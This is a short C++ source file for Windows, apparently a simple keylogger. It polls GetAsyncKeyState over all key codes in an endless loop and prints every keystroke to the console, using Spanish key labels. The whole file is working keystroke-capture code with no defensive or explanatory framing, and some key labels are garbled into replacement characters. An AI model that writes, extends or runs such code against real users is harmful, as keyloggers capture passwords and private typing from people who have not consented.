#include <iostream>
#include <string>
#include <map>
#include <windows.h>

using namespace std;

int main(int argc, char *argv[]){
	
	map<int, string> ch;
    ch[1] = " [Click Izq] ";
    ch[2] = " [Click Der] ";
    ch[8] = " [Borrar] ";
    ch[9] = " [Tab] ";
    ch[13] = " [Enter] ";
    ch[16] = " [Shift] ";
    ch[17] = " [Control] ";
    ch[18] = " [Alt] ";
    ch[20] = " [Bloq Mayus] ";
    ch[27] = " [Esc] ";
    ch[32] = " ";
    ch[37] = " [Flecha izquierda] ";
    ch[38] = " [Flecha arriba] ";
    ch[39] = " [Flecha derecha] ";
    ch[40] = " [Flecha abajo] ";
    ch[44] = " [Impr Pant] ";
    ch[45] = " [Insert] ";
    ch[46] = " [Supr] ";
    ch[48] = "0";
    ch[49] = "1";
    ch[50] = "2";
    ch[51] = "3";
    ch[52] = "4";
    ch[53] = "5";
    ch[54] = "6";
    ch[55] = "7";
    ch[56] = "8";
    ch[57] = "9";
    ch[65] = "a";
    ch[66] = "b";
    ch[67] = "c";
    ch[68] = "d";
    ch[69] = "e";
    ch[70] = "f";
    ch[71] = "g";
    ch[72] = "h";
    ch[73] = "i";
    ch[74] = "j";
    ch[75] = "k";
    ch[76] = "l";
    ch[77] = "m";
    ch[78] = "n";
    ch[79] = "o";
    ch[80] = "p";
    ch[81] = "q";
    ch[82] = "r";
    ch[83] = "s";
    ch[84] = "t";
    ch[85] = "u";
    ch[86] = "v";
    ch[87] = "w";
    ch[88] = "x";
    ch[89] = "y";
    ch[90] = "z";
    ch[91] = " [Windows] ";
    ch[96] = "0";
    ch[97] = "1";
    ch[98] = "2";
    ch[99] = "3";
    ch[100] = "4";
    ch[101] = "5";
    ch[102] = "6";
    ch[103] = "7";
    ch[104] = "8";
    ch[105] = "9";
    ch[106] = "*";
    ch[107] = "+";
    ch[109] = "-";
    ch[110] = ".";
    ch[111] = "/";
    ch[112] = " [F1] ";
    ch[113] = " [F2] ";
    ch[114] = " [F3] ";
    ch[115] = " [F4] ";
    ch[116] = " [F5] ";
    ch[117] = " [F6] ";
    ch[118] = " [F7] ";
    ch[119] = " [F8] ";
    ch[120] = " [F9] ";
    ch[121] = " [F10] ";
    ch[122] = " [F11] ";
    ch[123] = " [F12] ";
    ch[144] = " [ Bloq Num ] ";
    ch[145] = " [Bloq Despl] ";
    ch[186] = "`";
    ch[187] = "+";
    ch[188] = ",";
    ch[189] = "-";
    ch[190] = ".";
    ch[191] = "�";
    ch[192] = "�";
    ch[219] = "'";
    ch[220] = "�";
    ch[221] = "�";
    ch[222] = "�";
    ch[226] = "<";
	
	while(true){
		
		for (int i = 0; i < 256; i++){
			
			if(GetAsyncKeyState(i) == -32767){
				
				cout << ch[i].c_str();
				
			}
			
		}
		
	}
	
	return 0;
	
}
